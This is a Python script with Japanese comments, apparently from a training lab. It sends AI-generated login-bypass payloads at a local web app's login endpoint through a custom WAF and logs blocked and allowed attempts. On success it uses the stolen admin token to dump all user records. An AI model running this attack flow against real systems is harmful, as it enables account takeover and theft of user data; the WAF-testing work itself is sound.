import requests
import json
import red_ai
import waf
import challengeAPI

#メイン関数
def main():
    payload = payload_p()
    user_token,logs = attack_p(*payload) #payloadは複数の戻り値があるので*を使用
    for i in logs:
        print(f"攻撃ログ：{i}")

    with open("logs.json","w",encoding="utf-8") as f:
        json.dump(logs,f,ensure_ascii=False,indent=4)
    print("現在のWAF防御率は:",defence_rate(logs))
    if user_token:
        a = input("ユーザー情報を取得しますか？[Y or N]:")
        if a in["Y","y","yes"]:
            token_p(user_token)
        else:
            print("処理を終了します")
#攻撃用ペイロード
def payload_p():
    url = "http://localhost:3000/rest/user/login"  # 攻撃対象のURL
    ai_reply = red_ai.payload_ganerate() #別ファイルaicode.pyからAIで生成したペイロード読み込み
    email_payloads = ai_reply 
    pass_payloads = "aaa"
    return url,email_payloads,pass_payloads
#用意したペイロードから実際に攻撃
def attack_p(url,email_pay,pass_pay):
    logs= []
    token = None
    #引数のemailペイロードを順番に読み込み
    for i in email_pay:
        print(f"\n実行中[email]:{i}---" )
        #email部分とpassword部分をpaylod変数に組み合わせ
        payload = {"email":i,"password":pass_pay}
        response = waf.waf_req(url, payload) # waf.pyを経由し攻撃をフィルタリングする
        # judge = challengeAPI.api_solved("Login Admin")
        #攻撃結果表示
        if response is None:
            recode = {
                "ペイロード": i,
                "WAF":"Blocked",
                "ステータスコード":None,
                "攻撃結果": False,
            }
            logs.append(recode)
            print("WAFが攻撃をブロックしました")
        else:
            #WAFにブロックされず通過した場合ここで攻撃を記録
            recode = {
                "ペイロード": i,
                "WAF":"Allowed",
                "ステータスコード": response.status_code,
                "攻撃結果":response.status_code == 200,
            }
            logs.append(recode) #logs配列に入れる
            #攻撃が成功した場合の処理
            if response.status_code == 200:
                print("攻撃が成功しました。")
                if token is None:
                    #取得したjsonファイルの構造がAuthenticationの中にtokenがあるので、tokenを取得する
                    token = response.json()["authentication"]["token"]  
                    print("取得したトークン:", token)
                else:
                    print("トークン取得済み")
            else:
                print("攻撃が失敗しました。")
                print("ステータスコード:", response.status_code)
    return token,logs
        
#ユーザーデータ取得
def token_p(token):
    myheaders = {"Authorization":f"Bearer {token}"}
    rsa_auth = requests.get("http://localhost:3000/api/Users",headers=myheaders)
    print("ステータスコード:",rsa_auth.status_code)
    print("全ユーザー情報:", rsa_auth.json())
#防御率計算
def defence_rate(logs):
    total = len(logs)
    block = sum(1 for i in logs if i["WAF"] == "Blocked")
    return block/total

if __name__ == "__main__":
    main()
